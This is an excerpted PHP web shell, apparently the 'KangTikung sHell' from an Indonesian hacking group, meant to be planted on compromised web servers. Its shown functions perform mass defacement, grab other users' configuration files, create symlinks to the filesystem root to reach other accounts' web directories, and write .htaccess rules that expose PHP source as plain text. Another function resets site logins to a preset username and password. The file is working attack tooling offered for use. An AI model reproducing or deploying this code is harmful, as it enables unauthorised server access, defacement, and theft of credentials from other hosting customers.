<?php
/*
	* Konsep Shell : Brillyan -Founder { KangTikung }-
	* Pembuat : Holiq - { KangTikung }
	
	* Re-Code Boleh Asal Dah Izin Sama Pembuat, Ganti Author & Re-Code Tanpa Seizin Pembuat... Fix Lo Noob Anjenk
	* Klo Kga Bisa Bikin Cek Chanel KangTikung, Ada Tutornya, Jangan Cuma Bisa Ganti Author Doank Bangsad
	* https://www.youtube.com/playlist?list=PLAAbQaUpDeM7nGwS6WfaTm_cPC3RUiswi

	* Thanks For All Member { KangTikung }, Yang Telah Membantu Proses Pembuatan Shell,Dan Dari Shell Lain Untuk Inspirasinya

	* { KangTikung sHell }
	* �2022 { KangTikung } -Holiq-
...
/* Configurasi */
$aupas 			= "6bc7cf6c056fa8ee34582d3b74149565";// KangTikung
...
<html>
	<head>
		...
		<meta name="copyright" content="{ KangTikung }"/>
		<title>{ KangTikung sHell }</title>
		<link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/KangTikung.png"/>
	...
	<body class="bg-dark text-center text-light">
		...
		<a href="https://facebook.com/KangTikungOfficial" class="text-muted fixed-bottom mb-3">Copyright 2022 @ { KangTikung }</a>
	</body>
</html>
<?php
exit;
...
function about(){
	echo '<div class="card text-center bg-light about">
		<h4 class="card-header">{ KangTikung }</h4>
		<div class="card-body">
			<center><div class="img"></div></center>
			<p class="card-text">{ KangTikung } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
		</div>
		<div class="card-footer">
			<small class="card-text text-muted">Copyright 2022 { KangTikung }</small>
		</div>
	</div><br/>';
	exit;
}
...
function aksiMasdef($dir,$file,$imgfol,$imgfile){
	...
	if($_POST['start']){
		...
		echo "<form method='post'>
			...
			<textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By { KangTikung }'></textarea><br/>
...
function aksiConfig($dir,$file){
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("KangTikung_config", 0777);
		$isi_htc = "Options allnRequire NonenSatisfy Any";
		$htc = fopen("KangTikung_config/.htaccess","w");
		fwrite($htc, $isi_htc);
			...
			if(is_readable($user_config_dir)){
				...
				foreach($grab_config as $config => $nama_config){
					...
					if($ambil_config == ''){
						...
						$file_config = fopen("KangTikung_config/$user_con-$nama_config.txt","w");
		...
		<a href='?dir=$dir/KangTikung_config' class='btn btn-success btn-block mb-4'>Click Here</a>";
	}else{
		echo "<form method='post'>
...
function aksiSym($dir,$file){
	...
	##htaccess
	if($d0mains){
		@mkdir("KangTikung_sym",0777);
		@chdir("KangTikung_sym");
		@exe("ln -s / root");
				...
				if(eregi("zone",$d0main)){
					...
					if(strlen(trim($domains[1][0])) > 2){
						...
						echo "<tr>
							...
							<td>".$user['name']."</td>
							<td><a href='$full/KangTikung_sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a></td>
						</tr>";
						flush();
						$dcount++;
					}
			...
			<table class='text-center table-responsive'>
				...
				while(!feof($file)){
					...
					echo "<tr>
						<td>".$dcount."</td>
						<td>".$matches."</td>
						<td><a href=$full/KangTikung_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
					</tr>";
					$dcount++;
				}
				fclose($file);
...
function aksiSymread($dir,$file){
	...
	<textarea class='form-control' rows='13' name='file'>";
		...
		if ($r3ad){
			...
			if ($sm){
				$r3ad = @fopen('KangTikung_sym/sym.txt', 'r');
				$content = @fread($r3ad, @filesize($file));
				echo "".htmlentities($content)."";
			}
		}
...
function sym404($dir,$file){
	$cp = get_current_user();
	if($_POST['execute']){
		@rmdir("KangTikung_sym404");
		@mkdir("KangTikung_sym404", 0777);
		$dir = $_POST['dir'];
		$isi = $_POST['isi'];
		@system("ln -s ".$dir."KangTikung_sym404/".$isi);
		@symlink($dir,"KangTikung_sym404/".$isi);
		$inija = fopen("KangTikung_sym404/.htaccess", "w");
		@fwrite($inija,"ReadmeName ".$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain php html php5 phtml\nAddHandler text/plain php html php5 phtml\nSatisfy Any");
		echo'<a href="/KangTikung_sym404/" target="_blank" class="btn btn-success btn-block mb-3">Click Me!!</a>';
	}else{
...
function autoEdit($dir,$file){
	if($_POST['hajar']){
		...
		<form method='post'>
			...
			<h5>Set User & Pass :</h5>
			<input type='text' name='user_baru' value='KangTikung' class='form-control mb-3' placeholder='Set Username'>
			<input type='text' name='pass_baru' value='KangTikung' class='form-control mb-4' placeholder='Set Password'>
	...
	<body class="bg-dark text-light">
		...
		<nav class="navbar static-top navbar-dark">
			...
			<div class="collapse navbar-collapse" id="info">
				<ul>
					<a href="https://facebook.com/KangTikungOfficial" class="lain"><i class="fa fa-facebook tambah"></i></a>
					<a href="https://www.instagram.com/KangTikung.id" class="lain"><i class="fa fa-instagram tambah"></i></a>
					<a href="https://www.youtube.com/KangTikung" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
					<a href="https://github.com/KangTikungid" class="lain"><i class="fa fa-github tambah"></i></a>
					<a href="https://KangTikung.web.id" class="lain"><i class="fa fa-globe tambah"></i></a>
				</ul>
			</div>
		</nav>
		<?php
		echo '<div class="container">
			<h1 class="text-center"><a href="https://facebook.com/KangTikungOfficial" style="color:#ffffff;">{ KangTikung }</h1>
...
';
				...
				echo '</table></div><hr/>
				<center><a class="text-muted" href="https://facebook.com/KangTikungOfficial">Copyright 2022 { KangTikung }</a></center><br/>';	
